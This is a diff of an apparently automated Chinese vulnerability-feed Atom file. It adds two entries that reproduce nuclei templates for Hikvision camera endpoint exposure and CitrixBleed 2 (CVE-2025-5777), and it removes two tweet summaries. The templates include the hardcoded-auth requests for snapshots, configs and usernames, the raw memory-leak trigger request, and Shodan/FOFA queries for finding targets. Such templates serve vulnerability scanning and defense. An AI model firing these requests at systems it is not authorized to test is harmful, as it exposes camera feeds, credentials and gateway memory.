@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-05T18:00:17.451Z</updated>
+  <updated>2025-07-05T18:15:46.396Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,58 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Hikvision IP Camera Snapshot, Config, and User Info Exposure Vulnerability</title>
+    <link href="http://example.com/2025/07/05/github_2898359546/"/>
+    <id>http://example.com/2025/07/05/github_2898359546/</id>
+    <published>2025-07-05T18:15:46.000Z</published>
+    <updated>2025-07-05T18:15:46.396Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Hikvision IP Camera Snapshot, Config, and User Info Exposure Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-36260</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该漏洞影响Hikvision IP摄像头，这是一种广泛部署于企业和家庭监控系统中的设备，用于视频监控和安全防护。Hikvision作为全球领先的视频监控产品供应商，其设备在全球范围内有着广泛的应用。漏洞允许攻击者无需认证即可访问敏感端点，包括实时快照、加密的配置文件以及包含用户凭证的XML文件。这主要是由于设备对某些端点的访问控制不足，导致未授权访问。技术根源在于设备未能正确验证请求的合法性，使得攻击者可以绕过认证机制直接访问敏感信息。此漏洞的高危性在于，攻击者可以利用泄露的信息进一步攻击系统，如获取管理员权限、篡改配置或进行其他恶意活动。由于无需认证即可利用，且存在自动化攻击的可能，该漏洞对受影响设备构成了严重威胁。</p><p><strong>产品厂商：</strong> Hikvision</p><p><strong>产品名称：</strong> Hikvision IP Camera</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/c638200226d238edb5730d453bea2911782f68a6/vulnerabilities%2Fiot%2Fhikvision%2Fhikvision-cam-info-exposure.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/c638200226d238edb5730d453bea2911782f68a6/vulnerabilities%2Fiot%2Fhikvision%2Fhikvision-cam-info-exposure.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> hikvision-cam-info-exposure<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Hikvision IP Camera <span class="hljs-operator">-</span> Snapshot, Config, and User Info Exposure<br>  <span class="hljs-params">author:</span> AbdulrahmanTamim<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    Detects unauthenticated exposure of sensitive endpoints on vulnerable Hikvision IP cameras.<br>    This includes live snapshot feeds, encrypted configuration files, and full user credential XML.<br>    Based on exploit chaining of CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">36260</span> and related bypass logic.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.cve.org<span class="hljs-operator">/</span>CVERecord<span class="hljs-operator">?</span>id<span class="hljs-operator">=</span>CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">36260</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.nist.gov/vuln/detail/CVE-2021-36260</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//seclists.org/fulldisclosure/2017/Sep/23</span><br>  <span class="hljs-params">tags:</span> hikvision,iot,camera,cve,cve2021,exposure,auth-bypass,config,snapshot,xml<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">b64auth:</span> YWRtaW46MTEK<br><br><span class="hljs-params">requests:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/onvif-http/snapshot?auth=&#123;&#123;b64auth&#125;&#125;&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> <span class="hljs-string">&quot;Unauthenticated Snapshot Exposure&quot;</span><br>        <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/System/configurationFile?auth=&#123;&#123;b64auth&#125;&#125;&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> <span class="hljs-string">&quot;Downloadable Config File&quot;</span><br>        <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Content-Type: application/octet-stream&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/Security/users?auth=&#123;&#123;b64auth&#125;&#125;&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> <span class="hljs-string">&quot;Exposed Usernames&quot;</span><br>        <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&lt;userName&gt;&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&lt;userLevel&gt;&quot;</span><br>        <span class="hljs-params">condition:</span> and<br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> Usernames<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&lt;userName&gt;(.*?)&lt;/userName&gt;&quot;</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Hikvision IP Camera Snapshot, Config, a</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Citrix NetScaler Memory Disclosure - CitrixBleed 2</title>
+    <link href="http://example.com/2025/07/05/github_585142599/"/>
+    <id>http://example.com/2025/07/05/github_585142599/</id>
+    <published>2025-07-05T18:15:26.000Z</published>
+    <updated>2025-07-05T18:15:26.340Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Citrix NetScaler Memory Disclosure - CitrixBleed 2</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5777</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Citrix NetScaler是一款广泛使用的应用交付控制器和网关产品，主要用于企业级网络环境中，提供负载均衡、应用加速和安全访问等功能。由于其广泛部署，一旦存在安全漏洞，可能对大量企业网络造成严重影响。该漏洞被命名为CitrixBleed 2，属于信息泄露类型，其技术根源在于NetScaler管理接口上的输入验证不足，导致内存过度读取。攻击者可以利用此漏洞，通过构造特定的HTTP请求，触发内存泄露，从而获取敏感信息。由于漏洞的严重性被标记为’严重’，且无需认证即可远程利用，这意味着攻击者可以相对容易地利用此漏洞进行攻击，对受影响系统的机密性构成严重威胁。此外，漏洞的利用可能导致企业网络中的敏感数据泄露，进一步加剧了安全风险。</p><p><strong>产品厂商：</strong> Citrix</p><p><strong>产品名称：</strong> NetScaler ADC, NetScaler Gateway</p><p><strong>搜索语法：</strong> title:”NetScaler Gateway”, title:”NetScaler AAA”, http.favicon.hash:-1166125415, http.favicon.hash:-1292923998, title&#x3D;”NetScaler Gateway”, title&#x3D;”NetScaler AAA”, icon_hash&#x3D;”-1166125415”, icon_hash&#x3D;”-1292923998”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/b0703a69e73057ef45da19fb4d7a559a398f2189/http%2Fcves%2F2025%2FCVE-2025-5777.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/b0703a69e73057ef45da19fb4d7a559a398f2189/http%2Fcves%2F2025%2FCVE-2025-5777.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">5777</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Citrix NetScaler Memory Disclosure <span class="hljs-operator">-</span> CitrixBleed <span class="hljs-number">2</span><br>  <span class="hljs-params">author:</span> watchtowr,DhiyaneshDk,darses<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Insufficient input validation leading to memory overread on the NetScaler Management Interface NetScaler ADC and NetScaler Gateway<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>support.citrix.com<span class="hljs-operator">/</span>support-home<span class="hljs-operator">/</span>kbsearch<span class="hljs-operator">/</span>article<span class="hljs-operator">?</span>articleNumber<span class="hljs-operator">=</span>CTX693420<br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>labs.watchtowr.com<span class="hljs-operator">/</span>how-much-more-must-we-bleed-citrix-netscaler-memory-disclosure-citrixbleed-<span class="hljs-number">2</span><span class="hljs-operator">-</span>cve-<span class="hljs-number">202</span>5-<span class="hljs-number">5777</span><span class="hljs-symbol">/</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2025-5777</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.00042</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.12361</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span><br>      <span class="hljs-operator">-</span> title:<span class="hljs-string">&quot;NetScaler Gateway&quot;</span><br>      <span class="hljs-operator">-</span> title:<span class="hljs-string">&quot;NetScaler AAA&quot;</span><br>      <span class="hljs-operator">-</span> http.favicon.hash:-<span class="hljs-number">1166125415</span><br>      <span class="hljs-operator">-</span> http.favicon.hash:-<span class="hljs-number">1292923998</span><br>    <span class="hljs-params">fofa-query:</span><br>      <span class="hljs-operator">-</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;NetScaler Gateway&quot;</span><br>      <span class="hljs-operator">-</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;NetScaler AAA&quot;</span><br>      <span class="hljs-operator">-</span> icon_hash<span class="hljs-operator">=</span><span class="hljs-string">&quot;-1166125415&quot;</span><br>      <span class="hljs-operator">-</span> icon_hash<span class="hljs-operator">=</span><span class="hljs-string">&quot;-1292923998&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,netscaler,citrix,exposure<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<span class="hljs-operator">+</span><br>        POST <span class="hljs-symbol">/p/u/doAuthentication.do</span> HTTP<span class="hljs-symbol">/1.0</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span>; <span class="hljs-attr">charset</span><span class="hljs-operator">=</span>UTF-<span class="hljs-number">8</span><br>        <span class="hljs-params">Content-Length:</span> <span class="hljs-number">5</span><br><br>        login<br><br>    <span class="hljs-params">unsafe:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;No active policy during authentication&quot;</span><br>        <span class="hljs-params">negative:</span> <span class="hljs-literal">true</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&lt;InitialValue&gt;&lt;/InitialValue&gt;&lt;Constraint&gt;&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&lt;InitialValue/&gt;&lt;Constraint&gt;&quot;</span><br>        <span class="hljs-params">negative:</span> <span class="hljs-literal">true</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> content_type<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;application/vnd.citrix.authenticateresponse&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Citrix NetScaler Memory Disclosure - Ci</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+  </entry>
   
   <entry>
     <title>0xdonzDev Twitter Update !</title>
@@ -477,57 +529,6 @@
     
     
     <category term="threatsbank" scheme="http://example.com/tags/threatsbank/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>0xm1rch Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_2834789102/"/>
-    <id>http://example.com/2025/07/05/twitter_2834789102/</id>
-    <published>2025-07-05T15:01:26.000Z</published>
-    <updated>2025-07-05T15:01:26.093Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> 0xm1rch</p><p><strong>推文：</strong> @cyb3rops @cyb3rops 如果你喜欢这个，你也会喜欢Sudo chroot漏洞 - <a href="https://t.co/ol5tSP1O2V">https://t.co/ol5tSP1O2V</a></p><p><strong>链接：</strong> <a href="https://x.com/0xm1rch/status/1941498932028391803">https://x.com/0xm1rch/status/1941498932028391803</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; 0xm1rch&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; @cyb3rops @cyb3rops 如果你喜欢这个，你也会喜欢Sudo chroot漏洞 - &lt;a href=&quot;https://t.co/ol5tSP1O2</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="0xm1rch" scheme="http://example.com/tags/0xm1rch/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Huntio Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_3210493506/"/>
-    <id>http://example.com/2025/07/05/twitter_3210493506/</id>
-    <published>2025-07-05T15:01:21.000Z</published>
-    <updated>2025-07-05T15:01:21.285Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> Huntio</p><p><strong>推文：</strong> ⚠️ Apache Traffic Server 中关键漏洞 CVE‑2025‑49763 正被利用</p><p><a href="https://t.co/v1ppBPvQss">https://t.co/v1ppBPvQss</a></p><p>ESI 插件中的内存耗尽缺陷允许远程攻击者发送特制请求，导致 ATS 服务器崩溃，从而破坏高流量的反向代理基础设施。此漏洞影响版本 9.0.0–9.2.10 和 10.0.0–10.0.5。</p><p>请立即升级至 ATS 9.2.11 或 10.0.6+ 版本，并设置新的 max‑inclusion‑depth 参数以限制资源使用。</p><p>#网络安全 #ApacheTrafficServer #CVE202549763</p><p><strong>链接：</strong> <a href="https://x.com/Huntio/status/1941501386253799630">https://x.com/Huntio/status/1941501386253799630</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; Huntio&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; ⚠️ Apache Traffic Server 中关键漏洞 CVE‑2025‑49763 正被利用&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://t.co/v</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="Huntio" scheme="http://example.com/tags/Huntio/"/>
     
   </entry>
   
